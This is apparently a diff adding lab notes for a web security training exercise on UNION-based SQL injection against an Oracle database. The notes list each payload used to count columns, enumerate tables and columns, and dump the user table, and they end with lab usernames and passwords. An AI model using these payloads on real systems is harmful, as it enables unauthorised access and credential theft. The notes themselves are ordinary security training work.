@@ -1,0 +1,55 @@
+Lab: SQL injection attack, listing the database contents on Oracle
+
+
+
+Determine how many columns
+
+' order by 3-- Error
+
+so 3 - 1 = 2 columns
+
+lets see if we can put text in them
+
+' UNION SELECT 'a' , 'a' FROM DUAL-- -> Correct
+
+both of them can contain text
+
+We know its oracle because the FROM DUAL
+
+Determine the tables
+
+	SELECT * FROM all_tables
+
+' UNION SELECT TABLE_NAME , NULL FROM all_tables--
+
+USERS_UQETPL
+
+Determine what's inside
+
+SELECT * FROM all_tab_columns 
+WHERE table_name = 'USERS_UQETPL'
+
+column_name 
+
+' UNION SELECT column_name , NULL FROM all_tab_columns WHERE table_name = 'USERS_UQETPL'--
+
+
+USERNAME_YEMTRQ
+
+PASSWORD_JNUZZC
+
+Determine the user and the password
+
+' UNION SELECT USERNAME_YEMTRQ || '  ' || PASSWORD_JNUZZC , NULL FROM USERS_UQETPL--
+
+
+                       <tr>
+                            <th>administrator  buqgypbjfw5enm5yys8s</th>
+                        </tr>
+                        <tr>
+                            <th>carlos  6j4k8k3h52svpa1p0r5x</th>
+                        </tr>
+                        <tr>
+                            <th>wiener  45137pd8cglsrsd98aam</th>
+                        </tr>
+
